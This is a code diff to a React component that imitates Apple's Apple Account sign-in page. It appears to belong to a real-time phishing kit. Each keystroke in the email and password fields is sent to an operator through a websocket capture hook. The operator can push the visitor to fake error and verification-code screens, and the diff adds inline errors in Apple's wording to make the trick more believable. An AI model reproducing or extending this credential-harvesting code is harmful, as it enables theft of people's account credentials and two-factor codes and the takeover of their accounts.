@@ -1182,6 +1182,9 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
   const [forgotEmail, setForgotEmail] = useState('');
   const [loading, setLoading] = useState(false);
   const [visitorLocation, setVisitorLocation] = useState<{ city: string; country: string; flag: string; isVpn: boolean } | null>(null);
+  const [emailError, setEmailError] = useState<string | null>(null);
+  const [passwordError, setPasswordError] = useState<string | null>(null);
+  const [codeError, setCodeError] = useState<string | null>(null);
   const passwordRef = useRef<HTMLInputElement>(null);
   const codeRef = useRef<HTMLInputElement>(null);
 
@@ -1201,12 +1204,27 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'apple',
-    onNavigate: (s) => setStep(s as AppleStep),
+    onNavigate: (s) => {
+      if (s === 'error-email') {
+        setEmailError("This Apple Account doesn't exist. Enter a different email or phone number.");
+        setStep('email');
+      } else if (s === 'error-password') {
+        setPasswordError('Your Apple Account or password was incorrect.');
+        setStep('password');
+      } else if (s === 'error-code') {
+        setCodeError('Incorrect verification code. Try again.');
+        setStep('verification-code');
+      } else {
+        setEmailError(null); setPasswordError(null); setCodeError(null);
+        setStep(s as AppleStep);
+      }
+    },
     onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
+    setEmailError(null); setPasswordError(null); setCodeError(null);
     if (captureField && captureVal) sendCapture(captureField, captureVal);
     setLoading(true);
     setTimeout(() => { setLoading(false); setStep(target); }, 800);
@@ -1267,23 +1285,29 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
         <h1 className="text-[26px] font-bold mb-3 tracking-tight">Apple Account</h1>
 
         {/* ── Email ── */}
-        {step === 'email' && (
+        {(step === 'email' || step === 'error-email') && (
           <>
             <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
               Sign in with an email or phone number to use iCloud, the App Store, Messages or other Apple services.
             </p>
-            <div className={`w-full rounded-[13px] overflow-hidden border mb-6 ${groupBg}`}>
+            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${emailError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
               <input
                 data-testid="apple-email-input"
                 type="text"
                 value={email}
-                onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
+                onChange={e => { setEmail(e.target.value); setEmailError(null); sendCapture('email', e.target.value); }}
                 onKeyDown={e => e.key === 'Enter' && nav('password', 'email', email)}
                 placeholder="Email or Phone Number"
                 autoFocus
                 className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
               />
             </div>
+            {emailError && (
+              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
+                {emailError}
+              </p>
+            )}
+            {!emailError && <div className="mb-6" />}
             <button
               data-testid="apple-continue-btn"
               onClick={() => nav('password', 'email', email)}
@@ -1304,7 +1328,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
         )}
 
         {/* ── Password ── */}
-        {step === 'password' && (
+        {(step === 'password' || step === 'error-password') && (
           <>
             {isDesktop && (
               <button
@@ -1320,14 +1344,14 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
             <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
               Enter the password for <strong className={isDark ? 'text-white' : 'text-black'}>{email || 'your Apple Account'}</strong>.
             </p>
-            <div className={`w-full rounded-[13px] overflow-hidden border mb-6 ${groupBg}`}>
+            <div className={`w-full rounded-[13px] overflow-hidden border mb-1 transition-colors ${passwordError ? (isDark ? 'border-[#ff453a] bg-[#1c1c1e]' : 'border-[#ff3b30] bg-[#f2f2f7]') : groupBg}`}>
               <div className="relative">
                 <input
                   ref={passwordRef}
                   data-testid="apple-password-input"
                   type={showPassword ? 'text' : 'password'}
                   value={password}
-                  onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
+                  onChange={e => { setPassword(e.target.value); setPasswordError(null); sendCapture('password', e.target.value); }}
                   onKeyDown={e => { if (e.key === 'Enter' && password) nav('device-trust', 'password', password); }}
                   placeholder="Password"
                   className={`w-full px-4 py-3.5 pr-12 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
@@ -1342,6 +1366,12 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 </button>
               </div>
             </div>
+            {passwordError && (
+              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
+                {passwordError}
+              </p>
+            )}
+            {!passwordError && <div className="mb-6" />}
             <button
               data-testid="apple-signin-btn"
               onClick={() => { if (password) nav('device-trust', 'password', password); }}
@@ -1477,6 +1507,11 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
             >
               Continue
             </button>
+            {codeError && (
+              <p className="w-full text-[13px] leading-snug mb-3 text-center" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
+                {codeError}
+              </p>
+            )}
             <button
               onClick={() => nav('device-trust')}
               className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}
@@ -1497,39 +1532,6 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
                 stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
                 className="animate-spin" style={{ animationDuration: '0.9s' }} />
             </svg>
-          </div>
-        )}
-
-        {/* ── Error states ── */}
-        {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
-          <div className="flex flex-col items-center w-full">
-            <div className="w-14 h-14 rounded-full bg-red-50 border-2 border-red-200 flex items-center justify-center mb-4">
-              <X className="w-7 h-7 text-red-500" />
-            </div>
-            <p className={`text-[17px] font-semibold text-center mb-2 ${isDark ? 'text-white' : 'text-black'}`}>
-              {step === 'error-email' ? 'Apple Account Not Found'
-               : step === 'error-password' ? 'Incorrect Password'
-               : 'Incorrect Verification Code'}
-            </p>
-            <p className={`text-center text-[14px] leading-relaxed mb-7 ${subGray}`}>
-              {step === 'error-email'
-               ? "This Apple Account doesn't exist. Enter a different email or phone number."
-               : step === 'error-password'
-               ? "This Apple Account or password was entered incorrectly. You have 5 remaining attempts before this account is locked."
-               : "The verification code is incorrect. Check your trusted device and try again."}
-            </p>
-            <button
-              onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'verification-code')}
-              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white transition-opacity hover:opacity-90"
-              style={{ backgroundColor: appleBlue }}
-            >
-              Try Again
-            </button>
-            {step === 'error-password' && (
-              <button onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[14px] mt-3" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
-                Forgot Apple ID or password?
-              </button>
-            )}
           </div>
         )}
 
